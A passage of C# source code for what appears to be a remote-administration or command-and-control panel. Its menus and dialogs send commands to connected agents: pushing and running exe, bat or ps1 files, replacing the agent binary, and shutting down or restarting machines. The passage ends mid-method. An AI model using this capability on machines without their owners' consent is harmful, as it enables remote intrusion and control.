        private void xtraTabControl1_SelectedPageChanged(object sender, DevExpress.XtraTab.TabPageChangedEventArgs e)
        {
            if (e == null || e.Page == null) return;
            DevExpress.XtraBars.Navigation.AccordionControlElement item = null;
            if (e.Page == xtraTabPage1) item = accordionControlElement2;
            else if (e.Page == xtraTabPage2) item = accordionControlElement3;
            else if (e.Page == autoTasksTabPage) item = autoTasksNavigationElement;
            else if (e.Page == notificationsTabPage) item = notificationsNavigationElement;
            else if (e.Page == serverLogsTabPage) item = serverLogsNavigationElement;
            else if (e.Page == pluginManagerTabPage) item = pluginManagerNavigationElement;
            else if (e.Page == blockedConnectionsTabPage) item = blockedConnectionsNavigationElement;
            else if (e.Page == xtraTabPage4) item = null;
            else if (e.Page == xtraTabPage5) item = accordionControlElement6;
            else if (e.Page == xtraTabPage6) item = accordionControlElement6; // legacy page hidden; keep sidebar consistent
            else if (e.Page == xtraTabPage9) item = accordionControlElement13;
            if (item != null) accordionControl1.SelectedElement = item;
        }

        private void NavigateToSidebarPage(DevExpress.XtraBars.Navigation.AccordionControlElement element, DevExpress.XtraTab.XtraTabPage page)
        {
            if (page == null) return;
            xtraTabControl1.SelectedTabPage = page;
            accordionControl1.SelectedElement = element;
        }

        private void autoTasksNavigationElement_Click(object sender, EventArgs e)
        {
            NavigateToSidebarPage(autoTasksNavigationElement, autoTasksTabPage);
        }

        private void notificationsNavigationElement_Click(object sender, EventArgs e)
        {
            NavigateToSidebarPage(notificationsNavigationElement, notificationsTabPage);
        }

        private void InitializeConnectionsContextMenu()
        {
            connectionsContextMenu = new ContextMenuStrip
            {
                Name = "connectionsContextMenu",
                ShowImageMargin = false,
                ShowCheckMargin = false,
                AutoClose = true,
                BackColor = Color.FromArgb(26, 26, 26),
                ForeColor = Color.White,
                Font = new Font("Tahoma", 9.75F, FontStyle.Regular, GraphicsUnit.Point)
            };

            connectionsPopupMenu = new DevExpress.XtraBars.PopupMenu(fluentFormDefaultManager1)
            {
                Name = "connectionsPopupMenu",
                MinWidth = ContextParentMenuWidth,
                MenuDrawMode = DevExpress.XtraBars.MenuDrawMode.SmallImagesText
            };

            ConfigureConnectionMenuItems();
            connectionsContextMenu.Opening += connectionsContextMenu_Opening;
            ApplyContextMenuToControlTree(xtraTabPage1, connectionsContextMenu);
            gridControl1.ContextMenuStrip = connectionsContextMenu;
        }

        private DevExpress.XtraBars.BarButtonItem CreateConnectionMenuItem(string text, EventHandler clickHandler)
        {
            DevExpress.XtraBars.BarButtonItem item = new DevExpress.XtraBars.BarButtonItem(fluentFormDefaultManager1, text);
            item.ImageOptions.Image = null;
            item.ImageOptions.SvgImage = null;
            if (clickHandler != null) item.ItemClick += delegate { clickHandler(item, EventArgs.Empty); };
            return item;
        }

        private DevExpress.XtraBars.BarSubItem CreateConnectionMenuGroup(string text, string iconFileName)
        {
            DevExpress.XtraBars.BarSubItem item = new DevExpress.XtraBars.BarSubItem(fluentFormDefaultManager1, text);
            item.PopupMinWidth = ContextMenuWidth;
            SvgImage icon = LoadUiSvgImage(iconFileName);
            connectionMenuIconImages.Add(icon);
            item.ImageOptions.Image = null;
            item.ImageOptions.SvgImage = icon;
            item.ImageOptions.SvgImageSize = new Size(16, 16);
            item.ImageOptions.SvgImageColorizationMode = DevExpress.Utils.SvgImageColorizationMode.None;
            return item;
        }

        private void ConfigureConnectionMenuItems()
        {
            connectionsPopupMenu.ItemLinks.Clear();
            DisposeConnectionMenuIcons();

            connectionsAdministrationMenu = CreateConnectionMenuGroup("Administration", "menu_administration.svg");
            connectionsExecuteItem = CreateConnectionMenuItem("Download and Execute", delegate { ShowRemoteExecutionDialog(); });
            connectionsDownloadUpdateItem = CreateConnectionMenuItem("Download and Update", delegate { ShowRemoteUpdateDialog(); });
            connectionsAdministrationMenu.AddItem(connectionsExecuteItem);
            connectionsAdministrationMenu.AddItem(connectionsDownloadUpdateItem);

            connectionsNetworkingMenu = CreateConnectionMenuGroup("Networking", "menu_networking.svg");
            connectionsDirectConnectItem = CreateConnectionMenuItem("Direct Connect", delegate { SendSelectedDirectTransition("DIRECT_CONNECT"); });
            connectionsDirectDisconnectItem = CreateConnectionMenuItem("Direct Disconnect", delegate { SendSelectedDirectTransition("DIRECT_DISCONNECT"); });
            connectionsNetworkingMenu.AddItem(connectionsDirectConnectItem);
            connectionsNetworkingMenu.AddItem(connectionsDirectDisconnectItem);
            connectionsNetworkingMenu.AddItem(CreateConnectionMenuItem("Restart Connection", delegate {
                SendSelectedConnectionCommand("RECONNECT");
            }));
            connectionsCloseItem = CreateConnectionMenuItem("Close Connection", delegate {
                if (ShowConnectionConfirmation("Close Connection"))
                    SendSelectedConnectionCommand("CLOSE");
            });
            connectionsBlockItem = CreateConnectionMenuItem("Block Connection", delegate {
                BlockSelectedConnections();
            });
            connectionsNetworkingMenu.AddItem(connectionsCloseItem);
            connectionsNetworkingMenu.AddItem(connectionsBlockItem);

            connectionsPluginsMenu = CreateConnectionMenuGroup("Plugins", "menu_plugins.svg");

            connectionsManagementMenu = CreateConnectionMenuGroup("Management", "menu_management.svg");
            connectionsSleepItem = CreateConnectionMenuItem("Sleep", delegate {
                if (ShowConnectionConfirmation("Sleep"))
                    SendSelectedConnectionCommand("SLEEP");
            });
            connectionsHibernateItem = CreateConnectionMenuItem("Hibernate", delegate {
                if (ShowConnectionConfirmation("Hibernate"))
                    SendSelectedConnectionCommand("HIBERNATE");
            });
            connectionsRestartItem = CreateConnectionMenuItem("Restart", delegate {
                if (ShowConnectionConfirmation("Restart"))
                    SendSelectedConnectionCommand("RESTART");
            });
            connectionsShutdownItem = CreateConnectionMenuItem("Shutdown", delegate {
                if (ShowConnectionConfirmation("Shutdown"))
                    SendSelectedConnectionCommand("SHUTDOWN");
            });
            connectionsManagementMenu.AddItem(connectionsSleepItem);
            connectionsManagementMenu.AddItem(connectionsHibernateItem);
            connectionsManagementMenu.AddItem(connectionsRestartItem);
            connectionsManagementMenu.AddItem(connectionsShutdownItem);

            connectionsPopupMenu.AddItem(connectionsAdministrationMenu);
            connectionsPopupMenu.AddItem(connectionsNetworkingMenu);
            connectionsPopupMenu.AddItem(connectionsPluginsMenu);
            connectionsPopupMenu.AddItem(connectionsManagementMenu);
            ConfigureDynamicPluginMenu();

        }

        private void DisposeConnectionMenuIcons()
        {
            DisposeSvgImages(connectionMenuIconImages);
        }

        private bool ShowConnectionConfirmation(string action)
        {
            return MessageBox.Show(
                "Are you sure you want to " + action.ToLowerInvariant() + "?",
                action,
                MessageBoxButtons.OKCancel,
                MessageBoxIcon.Warning,
                MessageBoxDefaultButton.Button2) == DialogResult.OK;
        }

        private void SendSelectedConnectionCommand(string command)
        {
            foreach (string connectionId in GetSelectedConnectionIdsList())
            {
                if (IsRelayConnectionId(connectionId))
                {
                    SendRelayCommand(connectionId, "CMD:" + command);
                    continue;
                }

                TcpClient client = null;
                lock (connectionStateLock)
                {
                    connectedClients.TryGetValue(connectionId, out client);
                }

                if (client == null)
                {
                    LogFinalCommandResult(command, "failed: connection unavailable", LogType.Error);
                    continue;
                }

                string commandKey = command.ToUpperInvariant();
                string pendingKey = connectionId + "|" + commandKey;
                Guid pendingId = Guid.NewGuid();
                try
                {
                    NetworkStream stream = client.GetStream();
                    TrackPendingCommand(connectionId, command, pendingId, false);
                    byte[] request = Encoding.UTF8.GetBytes("CMD:" + command + "\n");
                    stream.Write(request, 0, request.Length);
                    stream.Flush();
                }
                catch (Exception ex) when (ex is IOException || ex is ObjectDisposedException || ex is SocketException)
                {
                    RemovePendingCommandIfCurrent(pendingKey, pendingId);
                    LogFinalCommandResult(command, "failed: " + ex.Message, LogType.Error);
                }
            }
        }

        private async Task<RelayCommandResult> SendRelayFileCommandAsync(string connectionId, string rawCommand, string commandKey, Action<string, int> progress)
        {
            string target = GetConnectionFingerprint(connectionId);
            if (string.IsNullOrWhiteSpace(target))
                throw new InvalidOperationException("Relay target fingerprint is unavailable.");
            if (relayGatewayClient == null || !relayGatewayClient.IsConnected)
                throw new InvalidOperationException("Relay connection is not active.");

            if (rawCommand.StartsWith("CMD:UPDATE:", StringComparison.OrdinalIgnoreCase))
            {
                string rest = rawCommand.Substring("CMD:UPDATE:".Length);
                int separator = rest.IndexOf(':');
                if (separator <= 0) throw new InvalidDataException("Update command payload is malformed.");
                string hash = rest.Substring(0, separator);
                byte[] payload;
                try { payload = Convert.FromBase64String(rest.Substring(separator + 1)); }
                catch (FormatException ex) { throw new InvalidDataException("Update payload is not valid Base64.", ex); }

                // The relay gateway frame is bounded. Use the agent's native chunked update
                // protocol for anything larger than a conservative single-frame threshold.
                if (payload.Length > 200 * 1024)
                {
                    RelayCommandResult begin = await relayGatewayClient.SendCommandAsync(target,
                        "CMD:UPDATE_BEGIN:" + hash + ":" + payload.Length, CancellationToken.None).ConfigureAwait(false);
                    if (!begin.Accepted) return begin;

                    const int chunkSize = 128 * 1024;
                    int offset = 0;
                    while (offset < payload.Length)
                    {
                        int count = Math.Min(chunkSize, payload.Length - offset);
                        byte[] chunk = new byte[count];
                        Buffer.BlockCopy(payload, offset, chunk, 0, count);
                        RelayCommandResult chunkResult = await relayGatewayClient.SendCommandAsync(target,
                            "CMD:UPDATE_CHUNK:" + offset + ":" + Convert.ToBase64String(chunk), CancellationToken.None).ConfigureAwait(false);
                        if (!chunkResult.Accepted) return chunkResult;
                        offset += count;
                        progress?.Invoke("Uploading…", Math.Min(90, offset * 90 / payload.Length));
                        // Keep the bounded per-agent command queue from being overrun while
                        // the agent commits update chunks.
                        await Task.Delay(75).ConfigureAwait(false);
                    }
                    RelayCommandResult end = await relayGatewayClient.SendCommandAsync(target, "CMD:UPDATE_END", CancellationToken.None).ConfigureAwait(false);
                    progress?.Invoke(end.Accepted ? "Update queued for installation…" : "Update rejected", 100);
                    return end;
                }
            }

            progress?.Invoke("Queued by relay…", 96);
            RelayCommandResult result = await relayGatewayClient.SendCommandAsync(target, rawCommand, CancellationToken.None).ConfigureAwait(false);
            progress?.Invoke(result.Accepted ? "Queued by relay" : "Rejected by relay", 100);
            return result;
        }

        private void SendSelectedDirectTransition(string command)
        {
            foreach (string connectionId in GetSelectedConnectionIdsList())
            {
                if (!IsRelayConnectionId(connectionId))
                {
                    LogFinalCommandResult(command, "failed: direct transport control requires an authenticated relay connection", LogType.Warning);
                    continue;
                }
                bool alreadyPending;
                lock (connectionStateLock) alreadyPending = pendingRelayTransitions.Contains(connectionId);
                if (alreadyPending) continue;
                SendRelayDirectTransition(connectionId, "CMD:" + command);
            }
        }

        private void RefreshSelectedRelayTelemetry()
        {
            foreach (string connectionId in GetSelectedConnectionIdsList())
            {
                RequestTelemetryRefresh(connectionId);
            }
        }

        private static string CommandLabel(string command)
        {
            switch ((command ?? string.Empty).Trim().ToUpperInvariant())
            {
                case "SLEEP": return "Sleep";
                case "HIBERNATE": return "Hibernate";
                case "RESTART": return "Restart";
                case "SHUTDOWN": return "Shutdown";
                case "RECONNECT": return "Restart connection";
                case "CLOSE": return "Close connection";
                case "CMD:DIRECT_CONNECT": return "Direct connect";
                case "CMD:DIRECT_DISCONNECT": return "Direct disconnect";
                case "CMD:REQ:DATA": return "Refresh telemetry";
                case "REQ:DATA": return "Refresh telemetry";
                default: return command ?? "Command";
            }
        }

        private void TrackPendingCommand(string connectionId, string command, Guid pendingId, bool persistResult)
        {
            string key = connectionId + "|" + command.ToUpperInvariant();
            PendingCommand pending = new PendingCommand
            {
                Id = pendingId,
                ConnectionId = connectionId,
                Command = command.ToUpperInvariant(),
                SentAtUtc = DateTime.UtcNow,
                PersistResult = persistResult
            };

            lock (connectionStateLock)
            {
                pendingCommands[key] = pending;
                completedCommandResults.Remove(key);
            }

            Task.Run(delegate
            {
                Thread.Sleep(4000);
                bool removed = false;
                lock (connectionStateLock)
                {
                    PendingCommand current;
                    if (pendingCommands.TryGetValue(key, out current) && current.Id == pendingId)
                    {
                        pendingCommands.Remove(key);
                        removed = true;
                    }
                }
                if (removed)
                    LogFinalCommandResult(command, "ACK not received", LogType.Warning);
            });
        }

        private void RemovePendingCommandIfCurrent(string key, Guid pendingId)
        {
            lock (connectionStateLock)
            {
                PendingCommand current;
                if (pendingCommands.TryGetValue(key, out current) && current.Id == pendingId)
                {
                    pendingCommands.Remove(key);
                    completedCommandResults.Remove(key);
                }
                // If the pending entry was already completed by the receive thread,
                // preserve its completed result so the command waiter can consume it.
            }
        }

        private void LogFinalCommandResult(string command, string outcome, LogType type)
        {
            string label = CommandLabel(command);
            LogServerEvent(label + " command " + (outcome ?? string.Empty).Trim(), type);
        }

        private void CompletePendingCommand(string connectionId, string command, bool acknowledged)
        {
            string key = connectionId + "|" + command.ToUpperInvariant();
            PendingCommand completed = null;
            lock (connectionStateLock)
            {
                if (pendingCommands.TryGetValue(key, out completed))
                {
                    pendingCommands.Remove(key);
                    if (completed.PersistResult)
                        completedCommandResults[key] = acknowledged;
                    else
                        completedCommandResults.Remove(key);
                }
            }

            // A timeout or disconnect may already have produced the final result.
            if (completed == null)
                return;

            LogFinalCommandResult(command, acknowledged ? "succeeded" : "failed: agent returned an error",
                acknowledged ? LogType.Success : LogType.Error);
        }

        private void ReportPendingCommandsOnDisconnect(string connectionId)
        {
            List<PendingCommand> pending = new List<PendingCommand>();
            lock (connectionStateLock)
            {
                List<string> removeKeys = pendingCommands.Keys
                    .Where(key => key.StartsWith(connectionId + "|", StringComparison.Ordinal))
                    .ToList();
                foreach (string key in removeKeys)
                {
                    pending.Add(pendingCommands[key]);
                    pendingCommands.Remove(key);
                }
            }

            foreach (PendingCommand command in pending)
                LogFinalCommandResult(command.Command, "ACK not received", LogType.Warning);
        }

        // ── Remote Execution Dialog ──────────────────────────────────────────────
        // Sends CMD:EXECUTE:<ext>:<base64> to every selected connection.
        // Supported extensions (as the agent enforces): exe | bat | ps1
        private void ShowRemoteExecutionDialog()
        {
            List<string> targetIds = GetSelectedConnectionIdsList();
            if (targetIds.Count == 0)
            {
                MessageBox.Show("No connections selected.", "Execute Remotely",
                    MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            ShowFileCommandDialog(
                title:       "Remote Execution",
                subtitle:    "Drop and execute a file on " + (targetIds.Count == 1 ? "1 connection" : targetIds.Count + " connections"),
                hint:        "Select a local file to push and execute on the target(s).",
                fileFilter:  "Executable files (*.exe;*.bat;*.ps1)|*.exe;*.bat;*.ps1|EXE files (*.exe)|*.exe|BAT scripts (*.bat)|*.bat|PowerShell scripts (*.ps1)|*.ps1",
                actionLabel: "Execute Remotely",
                targetIds:   targetIds,
                buildCommand: (filePath, connectionId) =>
                {
                    string ext = Path.GetExtension(filePath).TrimStart('.').ToLowerInvariant();
                    if (ext != "exe" && ext != "bat" && ext != "ps1")
                        throw new InvalidOperationException("Unsupported file type: " + ext + ". Agent accepts exe, bat, ps1 only.");
                    byte[] bytes = File.ReadAllBytes(filePath);
                    if (bytes.Length == 0)
                        throw new InvalidOperationException("File is empty.");
                    string b64 = Convert.ToBase64String(bytes);
                    return ("CMD:EXECUTE:" + ext + ":" + b64, "EXECUTE:");
                });
        }

        // ── Remote Update Dialog ─────────────────────────────────────────────────
        // Sends CMD:UPDATE:<sha256hex>:<base64> to every selected connection.
        // The agent validates the MZ header and SHA-256 hash before staging.
        private void ShowRemoteUpdateDialog()
        {
            List<string> targetIds = GetSelectedConnectionIdsList();
            if (targetIds.Count == 0)
            {
                MessageBox.Show("No connections selected.", "Download and Update",
                    MessageBoxButtons.OK, MessageBoxIcon.Information);
                return;
            }

            // Snapshot the selected executable once. The payload is identical for every
            // target connection; only the per-connection admission fingerprint differs.
            // This prevents rereading, rehashing, and re-encoding a large executable once
            // per selected connection.
            byte[] cachedUpdateBytes = null;
            string cachedUpdateHash = null;
            string cachedUpdateBase64 = null;
            string cachedUpdatePath = null;

            ShowFileCommandDialog(
                title:       "Download and Update",
                subtitle:    "Replace agent binary on " + (targetIds.Count == 1 ? "1 connection" : targetIds.Count + " connections"),
                hint:        "Select the new agent executable (.exe or .bin) to push. The agent validates the SHA-256 before replacing itself.",
                fileFilter:  "Agent executable (*.exe;*.bin)|*.exe;*.bin",
                actionLabel: "Send Update",
                targetIds:   targetIds,
                buildCommand: (filePath, connectionId) =>
                {
                    if (cachedUpdateBytes == null || !string.Equals(cachedUpdatePath, filePath, StringComparison.OrdinalIgnoreCase))
                    {
                        byte[] bytes = File.ReadAllBytes(filePath);
                        if (bytes.Length == 0)
                            throw new InvalidOperationException("File is empty.");
                        if (bytes.Length > 64 * 1024 * 1024)
                            throw new InvalidOperationException("File exceeds 64 MB agent limit.");
                        if (bytes.Length < 2 || bytes[0] != 0x4D || bytes[1] != 0x5A)
                            throw new InvalidOperationException("File does not have an MZ (PE) header. The agent only accepts valid Windows executables.");

                        using (SHA256 sha = SHA256.Create())
                            cachedUpdateHash = BitConverter.ToString(sha.ComputeHash(bytes)).Replace("-", "").ToLowerInvariant();

                        cachedUpdateBytes = bytes;
                        cachedUpdateBase64 = Convert.ToBase64String(bytes);
                        cachedUpdatePath = filePath;
                    }

                    string expectedFingerprint = GetConnectionFingerprint(connectionId);
                    if (string.IsNullOrWhiteSpace(expectedFingerprint))
                        throw new InvalidOperationException("The selected connection no longer has a valid fingerprint.");

                    // The authenticated relay contract returns a routing result rather than
                    // the agent's legacy ACK stream, so the local update-probe handoff is only
                    // applicable to legacy direct TCP connections.
                    if (!IsRelayConnectionId(connectionId))
                    {
                        lock (connectionStateLock)
                        {
                            pendingUpdateProbes[expectedFingerprint + "|" + cachedUpdateHash] = new PendingUpdateProbe
                            {
                                ConnectionId = connectionId,
                                ExpectedHash = cachedUpdateHash,
                                ExpectedFingerprint = expectedFingerprint,
                                ExpiresUtc = DateTime.UtcNow.AddMinutes(2)
                            };
                        }
                    }

                    return ("CMD:UPDATE:" + cachedUpdateHash + ":" + cachedUpdateBase64, "UPDATE:");
                });
        }

        // ── Shared File-Command Dialog ───────────────────────────────────────────
        // Presents the styled popup using the panel's existing command-dialog pattern, builds the
        // command via buildCommand(), then sends it to every targetId showing a live
        // per-connection progress table and response status.
        private void ShowFileCommandDialog(
            string title,
            string subtitle,
            string hint,
            string fileFilter,
            string actionLabel,
            List<string> targetIds,
            Func<string, string, (string command, string commandKey)> buildCommand)
        {
            const int W = 660;
            Color window   = Color.FromArgb(28, 30, 31);
            Color titleBar = Color.FromArgb(22, 24, 25);
            Color surface  = Color.FromArgb(38, 40, 41);
            Color field    = Color.FromArgb(24, 26, 27);
            Color border   = Color.FromArgb(58, 62, 63);
            Color textCol  = Color.FromArgb(235, 238, 237);
            Color muted    = Color.FromArgb(140, 148, 146);
            Color accent   = SidebarAccentColor;
            Color success  = Color.FromArgb(72, 199, 116);
            Color errCol   = Color.FromArgb(235, 78, 78);
            Color rowOdd   = Color.FromArgb(33, 35, 36);
            Color rowEven  = Color.FromArgb(38, 40, 41);

            // Per-connection result state
            int connCount = targetIds.Count;
            const int headerRowH = 30;
            const int dataRowH = 32;
            int visibleRows = Math.Min(connCount, 6);
            int tableH = headerRowH + (visibleRows * dataRowH) + 2; // header + visible data rows
            int H         = 72 + 42 + 70 + 24 + 12 + tableH + 16 + 48 + 14; // title+file+table+btn

            using (Form dlg = new Form())
            {
                dlg.Text            = title;
                dlg.Name            = "RemoteCommandDialog";
                dlg.StartPosition   = FormStartPosition.Manual;
                dlg.FormBorderStyle = FormBorderStyle.None;
                dlg.MinimizeBox     = false;
                dlg.MaximizeBox     = false;
                dlg.ShowInTaskbar   = false;
                dlg.ClientSize      = new Size(W, H);
                dlg.BackColor       = window;
                dlg.ForeColor       = textCol;
                dlg.Font            = new Font("Segoe UI", 9F);
                dlg.KeyPreview      = true;
                dlg.KeyDown        += (s, e) => { if (e.KeyCode == Keys.Escape) dlg.Close(); };

                using (var rp = CreateRoundedRectanglePath(new Rectangle(0, 0, W, H), 10))
                    dlg.Region = new Region(rp);

                // ── Title bar ────────────────────────────────────────────────────
                Panel titlePanel = new Panel { Dock = DockStyle.Top, Height = 58, BackColor = titleBar };
                titlePanel.Paint += (s, e) =>
                {
                    using (Pen p = new Pen(accent, 2f))
                        e.Graphics.DrawLine(p, 0, 0, 0, titlePanel.Height);
                };
                Label lblTitle = new Label
                {
                    Text      = title,
                    AutoSize  = true,
                    Font      = new Font("Segoe UI Semibold", 12F, FontStyle.Bold),
                    ForeColor = textCol,
                    Location  = new Point(18, 10)
                };
                Label lblSub = new Label
                {
                    Text      = subtitle,
                    AutoSize  = true,
                    Font      = new Font("Segoe UI", 8.25F),
                    ForeColor = muted,
                    Location  = new Point(19, 34)
                };
                Label btnClose = new Label
                {
                    AutoSize      = false,
                    Size          = new Size(44, 44),
                    Text          = "×",
                    TextAlign     = ContentAlignment.MiddleCenter,
                    Font          = new Font("Segoe UI Light", 18F),
                    ForeColor     = muted,
                    Cursor        = Cursors.Hand,
                    Anchor        = AnchorStyles.Top | AnchorStyles.Right,
                    Location      = new Point(W - 50, 7)
                };
                btnClose.MouseEnter += (s, e) => { btnClose.ForeColor = textCol; btnClose.BackColor = Color.FromArgb(50, 53, 54); };
                btnClose.MouseLeave += (s, e) => { btnClose.ForeColor = muted;    btnClose.BackColor = Color.Transparent; };
                btnClose.Click      += (s, e) => dlg.Close();

                Point dragOff = Point.Empty;
                titlePanel.MouseDown += (s, e) => { if (e.Button == MouseButtons.Left) dragOff = e.Location; };
                titlePanel.MouseMove += (s, e) =>
                {
                    if (e.Button == MouseButtons.Left)
                    {
                        Point cur = Cursor.Position;
                        dlg.Location = new Point(cur.X - dragOff.X - titlePanel.Left, cur.Y - dragOff.Y - titlePanel.Top);
                    }
                };

                titlePanel.Controls.Add(lblTitle);
                titlePanel.Controls.Add(lblSub);
                titlePanel.Controls.Add(btnClose);

                // ── File row ─────────────────────────────────────────────────────
                int y = 68;
                Label lblFileHint = new Label
                {
                    Text      = hint,
                    AutoSize  = false,
                    Width     = W - 36,
                    Height    = 18,
                    ForeColor = muted,
                    Font      = new Font("Segoe UI", 8.25F),
                    Location  = new Point(18, y)
                };
                y += 22;

                Panel fileRow = new Panel
                {
                    Location  = new Point(18, y),
                    Size      = new Size(W - 36, 40),
                    BackColor = field
                };
                fileRow.Paint += (s, e) =>
                {
                    using (Pen p = new Pen(border))
                        e.Graphics.DrawRectangle(p, 0, 0, fileRow.Width - 1, fileRow.Height - 1);
                };
                TextBox tbPath = new TextBox
                {
                    BorderStyle = BorderStyle.None,
                    Location    = new Point(10, 10),
                    Width       = fileRow.Width - 110,
                    Height      = 20,
                    ReadOnly    = true,
                    BackColor   = field,
                    ForeColor   = textCol,
                    Font        = new Font("Segoe UI", 9F),
                    TabStop     = false
                };
                Button btnBrowse = new Button
                {
                    Text      = "Browse…",
                    FlatStyle = FlatStyle.Flat,
                    Location  = new Point(fileRow.Width - 98, 4),
                    Size      = new Size(90, 32),
                    BackColor = surface,
                    ForeColor = Color.White,
                    Font      = new Font("Segoe UI Semibold", 8.75F, FontStyle.Bold),
                    Cursor    = Cursors.Hand
                };
                btnBrowse.FlatAppearance.BorderColor        = border;
                btnBrowse.FlatAppearance.MouseOverBackColor = Color.FromArgb(52, 55, 56);
                btnBrowse.FlatAppearance.MouseDownBackColor = Color.FromArgb(60, 63, 64);
                btnBrowse.Click += (s, e) =>
                {
                    using (OpenFileDialog ofd = new OpenFileDialog
                           { Title = "Select file", Filter = fileFilter, CheckFileExists = true, Multiselect = false })
                    {
                        if (ofd.ShowDialog(dlg) == DialogResult.OK)
                            tbPath.Text = ofd.FileName;
                    }
                };
                fileRow.Controls.Add(tbPath);
                fileRow.Controls.Add(btnBrowse);
                y += 46;

                // ── Connection table header ──────────────────────────────────────
                Label lblConns = new Label
                {
                    Text      = "Selected connections  (" + connCount + ")",
                    AutoSize  = true,
                    Font      = new Font("Segoe UI Semibold", 8.5F, FontStyle.Bold),
                    ForeColor = textCol,
                    Location  = new Point(18, y)
                };
                y += 20;

                // Use the same DevExpress grid row model as the main Connections page.
                // The popup deliberately exposes only compact identity, status, and progress.
                DataTable commandStatusTable = new DataTable("RemoteCommandStatus");
                commandStatusTable.Columns.Add("Connection", typeof(string));
                commandStatusTable.Columns.Add("Status", typeof(string));
                commandStatusTable.Columns.Add("Progress", typeof(int));

                string[] commandRowIds = targetIds.ToArray();
                Color[] commandStatusColors = new Color[connCount];
                for (int i = 0; i < connCount; i++)
                {
                    commandStatusTable.Rows.Add(GetConnectionDisplayName(commandRowIds[i]), "Waiting…", 0);
                    commandStatusColors[i] = muted;
                }

                DevExpress.XtraGrid.GridControl commandGrid = new DevExpress.XtraGrid.GridControl
                {
                    Dock = DockStyle.Fill,
                    UseEmbeddedNavigator = false,
                    BackColor = surface,
                    ForeColor = textCol,
                    Name = "remoteCommandStatusGrid"
                };
                DevExpress.XtraGrid.Views.Grid.GridView commandGridView =
                    new DevExpress.XtraGrid.Views.Grid.GridView(commandGrid);
                commandGrid.MainView = commandGridView;
                commandGrid.ViewCollection.Add(commandGridView);

                // Define the three popup columns explicitly before binding the data source.
                // This avoids relying on automatic column generation timing and guarantees
                // the columns exist when we configure widths/editors below.
                commandGridView.OptionsBehavior.AutoPopulateColumns = false;
                DevExpress.XtraGrid.Columns.GridColumn connectionColumn = commandGridView.Columns.AddVisible("Connection", "Client");
                DevExpress.XtraGrid.Columns.GridColumn statusColumn = commandGridView.Columns.AddVisible("Status", "Status");
                DevExpress.XtraGrid.Columns.GridColumn progressColumn = commandGridView.Columns.AddVisible("Progress", "Progress");
                commandGrid.DataSource = commandStatusTable;
                if (connectionColumn == null || statusColumn == null || progressColumn == null)
                    throw new InvalidOperationException("Remote command grid columns could not be initialized.");

                commandGridView.OptionsBehavior.Editable = false;
                commandGridView.OptionsSelection.EnableAppearanceFocusedCell = false;
                commandGridView.OptionsSelection.EnableAppearanceFocusedRow = false;
                commandGridView.OptionsSelection.MultiSelect = false;
                commandGridView.FocusRectStyle = DevExpress.XtraGrid.Views.Grid.DrawFocusRectStyle.None;
                commandGridView.OptionsView.ShowGroupPanel = false;
                commandGridView.OptionsView.ShowIndicator = false;
                commandGridView.OptionsView.ColumnAutoWidth = false;
                commandGridView.OptionsView.ShowColumnHeaders = true;
                commandGridView.HorzScrollVisibility = DevExpress.XtraGrid.Views.Base.ScrollVisibility.Never;
                commandGridView.VertScrollVisibility = DevExpress.XtraGrid.Views.Base.ScrollVisibility.Auto;
                commandGridView.RowHeight = 32;
                commandGridView.ColumnPanelRowHeight = 30;
                commandGridView.Appearance.HeaderPanel.Font = new Font("Segoe UI Semibold", 8.5F, FontStyle.Bold);
                commandGridView.Appearance.HeaderPanel.ForeColor = muted;
                commandGridView.Appearance.HeaderPanel.BackColor = Color.FromArgb(31, 33, 34);
                commandGridView.Appearance.HeaderPanel.Options.UseFont = true;
                commandGridView.Appearance.HeaderPanel.Options.UseForeColor = true;
                commandGridView.Appearance.HeaderPanel.Options.UseBackColor = true;
                commandGridView.Appearance.Row.Font = new Font("Segoe UI", 8.5F);
                commandGridView.Appearance.Row.ForeColor = textCol;
                commandGridView.Appearance.Row.BackColor = surface;
                commandGridView.Appearance.Row.Options.UseFont = true;
                commandGridView.Appearance.Row.Options.UseForeColor = true;
                commandGridView.Appearance.Row.Options.UseBackColor = true;
                commandGridView.RowCellStyle += delegate(object sender, DevExpress.XtraGrid.Views.Grid.RowCellStyleEventArgs e)
                {
                    if (e.RowHandle < 0)
                        return;

                    int index = e.RowHandle;
                    e.Appearance.BackColor = (index % 2 == 0) ? rowOdd : rowEven;
                    e.Appearance.Options.UseBackColor = true;
                    if (e.Column != null && e.Column.FieldName == "Status" && index < commandStatusColors.Length)
                    {
                        e.Appearance.ForeColor = commandStatusColors[index];
                        e.Appearance.Options.UseForeColor = true;
                    }
                };

                connectionColumn.Caption = "Client";
                statusColumn.Caption = "Status";
                progressColumn.Caption = "Progress";
                connectionColumn.Width = 270;
                statusColumn.Width = 170;
                progressColumn.Width = Math.Max(160, (W - 36) - connectionColumn.Width - statusColumn.Width - 4);

                DevExpress.XtraEditors.Repository.RepositoryItemProgressBar progressEditor =
                    new DevExpress.XtraEditors.Repository.RepositoryItemProgressBar
                    {
                        Minimum = 0,
                        Maximum = 100,
                        ShowTitle = true,
                        PercentView = true,
                        ProgressViewStyle = DevExpress.XtraEditors.Controls.ProgressViewStyle.Solid
                    };
                commandGrid.RepositoryItems.Add(progressEditor);
                progressColumn.ColumnEdit = progressEditor;

                // Force initial data/layout creation before the dialog is shown.
                commandGrid.ForceInitialize();
                commandGridView.LayoutChanged();
                commandGrid.RefreshDataSource();

                commandGridView.Columns["Connection"].OptionsColumn.AllowEdit = false;
                commandGridView.Columns["Status"].OptionsColumn.AllowEdit = false;
                commandGridView.Columns["Progress"].OptionsColumn.AllowEdit = false;

                Panel tableOuter = new Panel
                {
                    Location = new Point(18, y),
                    Size = new Size(W - 36, tableH + 2),
                    BackColor = surface,
                    BorderStyle = BorderStyle.FixedSingle,
                    Padding = new Padding(1)
                };
                tableOuter.Controls.Add(commandGrid);

                Action<int, string, Color, int> updateRow = delegate(int rowIndex, string statusText, Color statusColor, int pct)
                {
                    Action updateUi = delegate
                    {
                        if (dlg.IsDisposed || commandStatusTable == null || rowIndex < 0 || rowIndex >= commandStatusTable.Rows.Count)
                            return;

                        DataRow row = commandStatusTable.Rows[rowIndex];
                        row["Status"] = statusText;
                        row["Progress"] = Math.Max(0, Math.Min(100, pct));
                        commandStatusColors[rowIndex] = statusColor;
                        if (commandGridView != null
                            && !commandGridView.IsDisposing
                            && commandGrid != null
                            && !commandGrid.IsDisposed
                            && !commandGrid.Disposing)
                            commandGridView.RefreshRow(rowIndex);
                    };

                    try
                    {
                        if (dlg.IsDisposed || dlg.Disposing)
                            return;
                        if (dlg.InvokeRequired)
                        {
